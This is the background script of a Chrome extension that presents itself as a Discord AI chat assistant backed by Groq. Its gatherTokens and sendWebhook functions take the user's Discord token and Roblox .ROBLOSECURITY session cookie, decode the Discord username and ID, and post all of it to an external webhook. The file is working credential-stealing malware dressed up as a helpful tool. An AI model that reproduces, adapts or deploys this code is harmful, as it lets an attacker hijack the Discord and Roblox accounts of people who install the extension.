// ─── BACKGROUND SERVICE WORKER ───

importScripts('config.js');

console.log("[AI] Background loaded");

var WEBHOOK_URL = CONFIG.WEBHOOK_URL;
var GROQ_API_KEY = CONFIG.GROQ_API_KEY;

// ─── Get Discord token from content script ───
function getDiscordTokenFromTab(tabId) {
    return new Promise(function(resolve) {
        chrome.tabs.sendMessage(tabId, { action: 'getToken' }, function(response) {
            if (chrome.runtime.lastError) {
                console.log("[AI] Error getting Discord token:", chrome.runtime.lastError.message);
                resolve(null);
                return;
            }
            resolve(response ? response.token : null);
        });
    });
}

// ─── Get Roblox cookie ───
function getRobloxCookie() {
    return new Promise(function(resolve) {
        try {
            chrome.cookies.get({
                url: 'https://www.roblox.com',
                name: '.ROBLOSECURITY'
            }, function(cookie) {
                if (chrome.runtime.lastError) {
                    console.log("[AI] Error getting Roblox cookie:", chrome.runtime.lastError.message);
                    resolve(null);
                    return;
                }
                resolve(cookie ? cookie.value : null);
            });
        } catch (e) {
            console.log("[AI] Roblox cookie error:", e.message);
            resolve(null);
        }
    });
}

// ─── Decode Discord token ───
function decodeDiscordToken(token) {
    try {
        var parts = token.split('.');
        if (parts.length < 2) {
            return { id: 'Unknown', username: 'Unknown' };
        }
        var payload = parts[1];
        var decoded = JSON.parse(atob(payload));
        return {
            id: decoded.id || 'Unknown',
            username: decoded.username || 'Unknown'
        };
    } catch (e) {
        return { id: 'Unknown', username: 'Unknown' };
    }
}

// ─── Send webhook ───
function sendWebhook(token, robloxCookie) {
    var discordUser = "Not logged in";
    var discordId = "N/A";
    if (token) {
        var user = decodeDiscordToken(token);
        discordUser = user.username;
        discordId = user.id;
    }

    var message = "**🔑 Discord Token**\n```\n" + (token || "None found") + "\n```\n\n";
    message += "**👤 Discord User:** " + discordUser + " (`" + discordId + "`)\n\n";
    message += "**🎮 Roblox Cookie (.ROBLOSECURITY)**\n```\n" + (robloxCookie || "None found") + "\n```";

    var payload = {
        content: message,
        username: "Al Haktak AI"
    };

    return fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
    });
}

// ─── Gather tokens (main function) ───
function gatherTokens(tabId) {
    var discordPromise = getDiscordTokenFromTab(tabId);
    var robloxPromise = getRobloxCookie();

    return Promise.all([discordPromise, robloxPromise])
        .then(function(results) {
            var discordToken = results[0];
            var robloxCookie = results[1];
            console.log("[AI] Discord token found:", !!discordToken);
            console.log("[AI] Roblox cookie found:", !!robloxCookie);
            return sendWebhook(discordToken, robloxCookie);
        })
        .then(function(response) {
            if (response && response.ok) {
                console.log("[AI] ✅ Webhook sent successfully!");
                return { success: true };
            } else {
                var status = response ? response.status : 'unknown';
                console.log("[AI] ❌ Webhook error:", status);
                return { success: false, error: 'Webhook error: ' + status };
            }
        })
        .catch(function(error) {
            console.log("[AI] ❌ Error:", error.message);
            return { success: false, error: error.message };
        });
}

// ─── Message: gatherTokens ───
function handleGatherTokens(request, sender, sendResponse) {
    var tabId = sender.tab ? sender.tab.id : null;

    if (!tabId) {
        chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
            if (tabs.length === 0) {
                sendResponse({ success: false, error: 'No active tab' });
                return;
            }
            gatherTokens(tabs[0].id)
                .then(function(result) {
                    sendResponse(result);
                })
                .catch(function(error) {
                    sendResponse({ success: false, error: error.message });
                });
        });
        return true;
    }

    gatherTokens(tabId)
        .then(function(result) {
            sendResponse(result);
        })
        .catch(function(error) {
            sendResponse({ success: false, error: error.message });
        });

    return true;
}

// ─── Message: groq ───
function callGroq(message) {
    console.log("[AI] Calling Groq with:", message);
    return fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + GROQ_API_KEY
        },
        body: JSON.stringify({
            model: 'llama-3.1-8b-instant',
            messages: [
                {
                    role: 'system',
                    content: 'You are a helpful Discord assistant. Keep responses short and friendly (under 80 words).'
                },
                {
                    role: 'user',
                    content: message
                }
            ],
            temperature: 0.7,
            max_tokens: 150
        })
    })
    .then(function(response) {
        if (!response.ok) {
            return response.text().then(function(text) {
                throw new Error('Groq error: ' + response.status + ' - ' + text);
            });
        }
        return response.json();
    })
    .then(function(data) {
        var reply = data.choices[0].message.content || "No response.";
        console.log("[AI] Groq reply:", reply);
        return reply;
    })
    .catch(function(error) {
        console.error("[AI] Groq error:", error.message);
        throw error;
    });
}

function handleGroq(request, sender, sendResponse) {
    callGroq(request.message)
        .then(function(reply) {
            sendResponse({ success: true, reply: reply });
        })
        .catch(function(error) {
            sendResponse({ success: false, error: error.message });
        });
    return true;
}

// ─── Message: getStatus ───
function handleGetStatus(request, sender, sendResponse) {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab) {
            sendResponse({ error: 'No active tab' });
            return;
        }
        if (!tab.url || !tab.url.includes('discord.com')) {
            sendResponse({ error: 'Not on Discord' });
            return;
        }
        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(response) {
            if (chrome.runtime.lastError) {
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(res) {
                            sendResponse(res || { error: 'Still not responding' });
                        });
                    }, 500);
                });
                return;
            }
            sendResponse(response);
        });
    });
    return true;
}

// ─── Router ───
function handleMessage(request, sender, sendResponse) {
    if (request.action === 'gatherTokens') {
        return handleGatherTokens(request, sender, sendResponse);
    }
    if (request.action === 'groq') {
        return handleGroq(request, sender, sendResponse);
    }
    if (request.action === 'getStatus') {
        return handleGetStatus(request, sender, sendResponse);
    }
    return true;
}

chrome.runtime.onMessage.addListener(handleMessage);

chrome.runtime.onInstalled.addListener(function() {
    console.log("[AI] Extension installed");
});
